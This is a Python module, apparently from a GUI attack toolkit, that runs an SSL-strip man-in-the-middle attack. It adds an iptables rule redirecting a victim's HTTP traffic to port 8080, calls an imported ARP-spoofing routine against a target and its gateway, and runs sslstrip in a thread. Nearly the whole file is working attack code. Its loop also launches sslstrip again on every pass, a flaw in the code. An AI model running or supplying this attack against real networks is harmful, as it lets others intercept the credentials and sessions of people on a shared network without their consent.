import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
from Layer2Attacks.PageArpAttacks.funcFrameArp import *

import scapy.all as scapy
import time
import threading
import traceback
import subprocess

from tkinter import *

def startSsl(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp) :
    testLink()

    global sslThreads, sslIsRunning, terminalLabel, wiresharkLabel, errorOutputLabel

    sslIsRunning = False
    sslThreads = threading.Thread(target = lambda : stripSsl())

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)

    terminalLabel['text'] += "$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 \n"
    terminalProcess = subprocess.Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"],
                                       stdout=subprocess.PIPE, universal_newlines=TRUE)
    terminalLabel['text'] += terminalProcess.communicate()[0]

    startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp, "#1A3329")
    runSslStripAttack()

def stopSsl(targetIp, defaultGatewayIp) :
    global sslThreads, sslIsRunning, terminalLabel, errorOutputLabel

    try :
        terminalLabel["text"] += "$ Stopping SSL Strip Attack..."
        sslIsRunning = False
        sslThreads.join(0)
        sslThreads = None

        stopArp(targetIp, defaultGatewayIp)

        terminalLabel["text"] += "$ SSL Strip Attack successfully stopped!"
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"

def runSslStripAttack() :
    global sslThreads, sslIsRunning
    sslIsRunning = True
    sslThreads.start()

def stripSsl() :
    global terminalLabel, errorOutputLabel, sslIsRunning, terminalProcess
    print("" + str(sslIsRunning) + " || ?\n")

    try :
        terminalLabel['text'] += "$ sslstrip -l 8080 \n"
        while sslIsRunning == True :
            terminalProcess = subprocess.Popen(["sslstrip", "-l", "8080"], stdout=subprocess.PIPE, universal_newlines=TRUE)
    
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"